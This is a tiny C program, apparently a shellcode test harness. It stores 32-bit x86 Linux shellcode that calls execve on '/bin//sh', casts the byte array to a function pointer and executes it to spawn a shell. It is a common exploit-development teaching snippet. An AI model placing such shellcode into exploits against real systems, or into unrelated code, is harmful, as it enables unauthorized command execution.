int main(int argc, char *argv[]) {
    char code[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80";

    int (*func)();                  /* function pointer */
    func = (int (*)()) code;        /* make it point to our code array */
    (int)(*func)();                 /* call it */
    /* if call is successful, it will return 0 instead of 1 */
    return 1;
}
